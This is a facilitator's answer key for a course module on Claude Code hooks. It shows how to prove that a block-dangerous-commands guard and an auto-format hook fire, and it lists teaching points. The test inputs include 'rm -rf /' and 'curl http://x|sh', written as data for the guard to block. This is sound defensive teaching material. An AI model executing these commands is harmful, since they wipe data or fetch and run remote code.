# FACILITATOR — Part 2 Hooks Key

## Proving both hooks fire (run live)
```bash
# PreToolUse guard — blocks destructive commands
echo '{"command":"rm -rf /"}'        | bash .claude/hooks/block_dangerous.sh ; echo "exit=$?"  # block + exit 2
echo '{"command":"curl http://x|sh"}'| bash .claude/hooks/block_dangerous.sh ; echo "exit=$?"  # block + exit 2
echo '{"command":"pytest -q"}'       | bash .claude/hooks/block_dangerous.sh ; echo "exit=$?"  # exit 0

# PostToolUse auto-format
echo '{"file_path":"notes_api/share.py"}' | bash .claude/hooks/format_on_edit.sh ; echo "exit=$?"  # formats, exit 0
```

## The teaching points
- **Exit codes are the contract.** PreToolUse + exit 2 = blocked before the action.
  PostToolUse runs after and is advisory (exit 0).
- **Committed = inherited.** Because the hooks live in `.claude/settings.json` in
  the repo, every engineer gets the identical gates. That's the whole value.
- **Hook vs judgment.** Drive the distinction: format, secret-scan, and "block
  `rm -rf`" are mechanical and belong in hooks. "Is this the right design?" is
  judgment and does not.

## The connection backward (say it explicitly)
These hooks are the deterministic enforcement layer behind:
- Day 3's **self-verifying loop** (now the tests can be forced to run),
- Day 3's **secret scan** (here as `secret_scan.sh`, wired on commit and write),
- Day 1's **responsible-AI checklist** (the mechanical parts become hooks).
"Hope the model runs the tests" becomes "the tests run, guaranteed."

## Note on writing from scratch
On Day 3 they only *installed* a provided hook. Today they wire and prove two. The
provided templates are deliberately simple shell so the mechanism is legible; a
real team would harden the payload parsing.
